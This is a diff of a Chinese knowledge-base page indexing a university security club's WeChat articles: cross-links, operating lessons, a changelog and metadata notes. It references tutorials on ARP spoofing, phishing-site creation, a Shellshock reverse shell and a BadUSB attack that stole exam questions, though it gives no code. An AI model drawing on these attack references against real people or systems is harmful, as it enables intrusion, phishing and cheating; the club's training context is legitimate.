+| 2020-01 | 第三届 0w1 CTF 报名/比赛/结果 | 归档索引条目 |
 
 ---
 
@@ -283,59 +141,51 @@ updated: '2026-11-14'
 
 | 关联页面 | 关联说明 |
 | :--- | :--- |
-| [[0w1club-wechat-archive-201707-201903]] | 2017–2019 早期归档索引，含 2019 春季招新全文，形成连续时间线 |
-| [[0w1club-week2-wifi-hijacking-arp-spoofing]] | 萌新培养第 2 周：ARP 欺骗/中间人攻击实战教程 |
-| [[phishing-website-creation-tutorial]] | 萌新培养第 3 周：钓鱼网站制作（SET/手工 PHP/Docker 三路径） |
-| [[crypto-basics-xor-stream-cipher-tutorial]] | 萌新培养第 4 周：密码学入门（异或/流密码/实战题目） |
-| [[rop-linux-x86-beginner-tutorial]] | 萌新培养第 5 周：ROP 入门（GDB/GEF/Pwntools 全工具链） |
-| [[0w1club-week8-raspberry-pi-training]] | 第八期萌新培养预告详情页（同mid=2247483961 idx=1） |
-| [[0w1club-training-shellshock-cgi-exploitation]] | **一次渗透测试实战分享会详细记录**（对应W2预告的实战内容） |
-| [[badusb-hid-attack-arduino-leonardo]] | **BadUSB HID 攻击原理、脚本编写、实战复现全过程详解**（与本文 BadUSB 演示文章互补，提供完整技术细节与防御视角） |
-| [[0w1club-hardware-atlas]] | 社团硬件租借计划「0w1硬件图鉴」六类设备清单（含 BadUSB、Proxymark3、Ubertooth One 等） |
-| [[reverse-engineering-beginner-learning-path]] | 逆向工程学习路径，可引用招新文“反汇编/软件破解”技能点 |
-| [[0th3rs-security-team-wechat-archive-201911-202204]] | 同类高校战队 0th3rs 微信归档索引，提供横向对照参照 |
-| [[ctftime-writeup-digest-20210325]] | CTFtime Writeup 汇总，展示同期外部赛事 Writeup 生态 |
-| [[0w1club-ctf-crypto-writeup-easyrsa-t9]] | 0W1俱乐部 Crypto 方向 Writeup：easyRSA 大数分解、T9 九键解码 |
-| [[0w1club-ctf-misc-writeup-steganography-traffic-analysis]] | 0W1俱乐部 MISC 方向 Writeup：JPEG隐写、流量分析、WiFi定位 |
-| [[0w1club-ctf-web-writeup-hash-extension-rsa]] | 0W1俱乐部 Web 方向 Writeup：哈希长度扩展、PHP弱类型、RSA解密 |
-| [[ar-drone-2.0-penetration-testing]] | AR Drone 2.0 渗透测试实战，无人机安全视角延伸 |
-| [[metasploit-framework-basics-tutorial]] | Metasploit 基础教程，渗透测试核心框架入门 |
-| [[burpsuite-basics-tutorial]] | Burp Suite 基础教程，Web 渗透测试必备工具 |
-| [[frp内网渗透应用]] | frp 内网穿透渗透应用，后渗透阶段横向移动技术 |
+| [[0w1club-wechat-archive-201707-201903]] | 早期归档索引（2017-07 至 2019-03），含 2019 春季招新全文、社团换届/积分制/双轨培养/铁三赛推广/博客建设等核心运营记录，与本页形成连续时间线。 |
+| [[0w1club-wechat-archive-201908-202207]] | 本期归档索引（2019-08 至 2022-07），本文作为其中“招新宣传文章”条目被收录，索引页提供完整文章列表、专题聚合视图、运营方法论总结及元数据字段说明。 |
+| [[0w1club-tiesan-training-camp]] | 记录「铁三训练营」课程上线及知识总结征稿，补充社团在铁人三项赛、国家信息安全水平考试、CISP 认证、知名安企就业通道方面的校企融合资源。 |
+| [[0w1club-hardware-atlas]] | 社团硬件租借计划设备清单（BadUSB、Proxmark3、Ubertooth One、HackRF One、RTL-SDR、树莓派等），支撑“无线安全”“硬件极客”方向实战教学。 |
+| [[0w1club-training-shellshock-cgi-exploitation]] | 萌新培养分享会「一次渗透测试」详细实战记录，演示 Bash Shellshock 漏洞（CVE-2014-6271）结合 CGI 环境变量注入反弹 Shell 全过程，对应招新文“内网渗透”方向承诺。 |
+| [[badusb-hid-attack-arduino-leonardo]] | BadUSB HID 攻击原理、脚本编写、实战复现全过程详解，关联招新文“PWN/硬件安全”方向及后续分享会物理攻击演示。 |
+| [[0th3rs-security-team-wechat-archive-201911-202204]] | 同类高校战队 0th3rs 微信归档索引，提供横向对照参照：文章索引结构、CTF 战报记录、社团运营节奏对比。 |
+| [[ctftime-writeup-digest-20210325]] | CTFtime Writeup 汇总，展示同期外部赛事 Writeup 生态，侧印 0w1Club 成员参与外部赛事的技术广度。 |
 
 ---
 
-## 数据维护记录
+## 运营方法论启示（源自招新文与后续实践）
+
+1. **品牌叙事显性化**：用“猫头鹰/0w1/黑夜捕猎者”构建记忆锚点，配合战绩（铁三赛西北第一）建立可信度。
+2. **技能清单标准化**：将研究方向拆解为七大技术领域并给出通俗定义，降低新生认知负荷，便于后续培训大纲对标。
+3. **资源承诺具体化**：明确列出“绿盟科技假期实习”“课题组科研训练”“CTFd 靶场”“硬件设备租借”等稀缺资源，转化为加入动力。
+4. **分层培养路径**：萌新技能树（编程/代码审计、网络协议、密码学、逆向、二进制利用）+ 大佬交流环境，构建“入门-进阶-实战”闭环。
+5. **筛选机制轻量化**：Base64 验证/问卷面试/群内答疑，零成本识别“会搜索、会动手、有好奇心”的种子用户。
+6. **节奏把控零真空**：靶场就绪 → 招新 → 见面 → 培训，每周一期分享会，形成标准化运营 SOP，三年持续复用。
+7. **攻防案例教学化**：真实渗透测试（Shellshock）、BadUSB 物理攻击复现，以“反面教材+防御视角”落地安全意识教育。
+
+---
+
+## 维护记录
 
 | 版本 | 日期 | 维护人 | 变更摘要 |
 | :--- | :--- | :--- | :--- |
-| 1.0 | 2026-11-13 | 知识库策展人 | 创建 2019-2022 归档索引页，录入第三届 0w1 CTF 结果与 2019 秋季招新两篇核心文章，建立专题聚合视图与运营方法论总结 |
-| 1.1 | 2026-11-13 | 知识库策展人 | 补充萌新培养周度系列交叉引用，完善校企融合与人才输送专题表格 |
-| 1.2 | 2026-11-13 | 知识库策展人 | 新增第三届 0w1 CTF 报名宣传文章（2020年1月），补充赛事完整时间线：报名宣传→比赛执行→结果公示，关联俱乐部 CTF Writeup 系列页面 |
-| 1.3 | 2026-11-13 | 知识库策展人 | 新增第八期萌新培养预告条目：树莓派（PI）有趣玩法分享会（2019年11月预估，mid=2247483961），完善萌新培养周度系列时间线至 W8，补充主讲人游江楠背景及投票定时间互动形式 |
-| 1.4 | 2026-11-13 | 知识库策展人 | 新增社团人事架构重组与部门成员招募条目（2019年11月，mid=2247483961 idx=2），记录组织架构从沙龙制向部门制演进、五大部门职责划分、公开招募机制及换届制度，补充社团运营方法论中的组织架构演进维度，关联同期W8预告条目 |
-| 1.5 | 2026-11-13 | 知识库策展人 | 新增「一次渗透测试」分享会条目（2019年10月预估，mid=2247483921），详细记录 Bash Shellshock 漏洞（CVE-2014-6271）结合 CGI 环境变量注入实现反弹 Shell 的完整实战教程 |
-| 1.6 | 2026-11-13 | 知识库策展人 | 新增「分享会预告|W2：一次渗透测试经历」条目（2019年10月预估，mid=2247483909），记录萌新培养第二期分享会预告，串联预告与实战分享会的完整培训闭环 |
-| 1.7 | 2025-01-15 | 知识库策展人 | 新增「请带我去实验室」详细条目（2019年10月，mid=2247483906），完整记录西安交通大学智能网络与网络安全教育部重点实验室的图文寻路指引 |
-| 1.8 | 2026-11-13 | 知识库策展人 | **新增 BadUSB 实战攻击演示文章条目（2019年9月初，mid=2247483721）**，详细记录利用 Arduino Leonardo 实现 BadUSB HID 攻击窃取期末试题的完整过程，涵盖硬件选型、载荷设计、物理实施窗口、攻击复现结果及防御启示，填补萌新培养系列中硬件物理攻击方向的空白，关联 [[badusb-hid-attack-arduino-leonardo]]、[[0w1club-hardware-atlas]] 等硬件安全页面，补充社团运营方法论中的攻防案例教学维度 |
+| 1.0 | 2026-01-15 | 知识库策展人 | 创建页面，提取招新文章核心内容，建立研究方向表格、活动清单、加入方式、时间线定位及交叉引用。 |
+| 1.1 | 2026-01-15 | 知识库策展人 | 补充运营方法论启示，关联 [[0w1club-hardware-atlas]]、[[badusb-hid-attack-arduino-leonardo]] 等硬件安全页面，完善与归档索引页的上下文链接。 |
 
 ---
 
 ## 附录：微信文章元数据字段说明
 
-| 字段 | 说明 | 示例 |
+| 字段 | 说明 | 示例（本文） |
 | :--- | :--- | :--- |
 | `__biz` | 公众号唯一标识 | `MzUzMzEwMDk3Mg==` |
-| `mid` | 消息 ID，单调递增，可推算发布先后 | `2247483664` (招新) < `2247483721` (**BadUSB**) < `2247483906` (实验室) < `2247483909` (**W2预告**) < `2247483921` (**渗透测试分享会**) < `2247483961` (W8预告/人事重组) < `2247484006` (CTF报名) < `2247484036` (CTF结果) |
-| `idx` | 多图文时的索引（1 开始） | `1` (W8预告/渗透测试/W2预告/实验室/BadUSB) / `2` (人事重组招募) |
-| `sn` | 签名哈希，用于去重校验 | `637b2fe48cd31fc676b2913bde2fc428` (BadUSB) / `7853e7efb9372ca8a74c500714b6817b` (实验室) |
-| `chksm` | 校验码 | `faa8618acddfe89cf9ac9bc0a6cb50c3e6e9cddcd7e89b59eecd5be3dbd35e08b729cc04595f` (BadUSB) |
-| `scene` | 来源场景值 | `21`/`27` (历史消息页) |
+| `mid` | 消息 ID，单调递增，可推算发布先后 | `2247483713` |
+| `idx` | 多图文时的索引（1 开始） | `1` |
+| `sn` | 签名哈希，用于去重校验 | `4b73a392c7740ffbe1112c15b967016b` |
+| `chksm` | 校验码 | `faa86182cddfe8945800757e419d1420e37f1fcc56e8a63b933e7a4cd42d9b5b44ac3509f880` |
+| `scene` | 来源场景值 | `27` (历史消息页) |
 
-> **提示**：若需批量导出或编程检索，可利用 `mid` 单调性配合 `scene=27` 抓取历史消息列表，再结合 `sn` 去重。同一 `mid` 不同 `idx` 表示同一次群发中的多篇图文。
+> **提示**：若需批量导出或编程检索，可利用 `mid` 单调性配合 `scene=27` 抓取历史消息列表，再结合 `sn` 去重。同一 `mid` 不同 `idx` 表示同一次群发中的多篇图文。本文 `mid=2247483713` 处于秋季招新宣传 `mid=2247483664` 与 BadUSB 实战演示 `mid=2247483721` 之间，符合 2019 年 9 月初发布的时间推算。
 
 ## 来源
 
-- [0w1网络安全俱乐部-201707-201903_18](../sources/0w1网络安全俱乐部-201707-201903_18.md)
-- [BadUSB 实战攻击演示文章](../sources/0w1网络安全俱乐部-201707-201903_18.md) (mid=2247483721)
-- [0w1网络安全俱乐部-201707-201903_42](../sources/0w1网络安全俱乐部-201707-201903_42.md)
+- [0w1网络安全俱乐部-201707-201903_43](../sources/0w1网络安全俱乐部-201707-201903_43.md)
